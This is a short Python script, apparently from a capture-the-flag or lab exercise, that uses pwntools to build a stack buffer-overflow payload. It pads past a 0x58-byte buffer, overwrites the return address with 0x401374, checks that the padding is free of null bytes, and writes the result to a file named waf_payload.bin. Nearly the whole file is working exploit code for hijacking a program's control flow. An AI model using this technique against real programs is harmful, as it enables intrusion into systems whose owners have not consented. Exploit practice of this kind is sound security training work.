from pwn import *
context.arch='amd64'
payload = b"exit" + b"A"*(0x58-4) + p64(0x401374)
# The null bytes are ONLY in the ret address' high bytes (trailing). No null in first 0x58 bytes.
assert b"\x00" not in payload[:0x58], "null in padding region"
open("/work/waf_payload.bin","wb").write(payload)
print("len", len(payload), "padding_null_free", b'\x00' not in payload[:0x58])
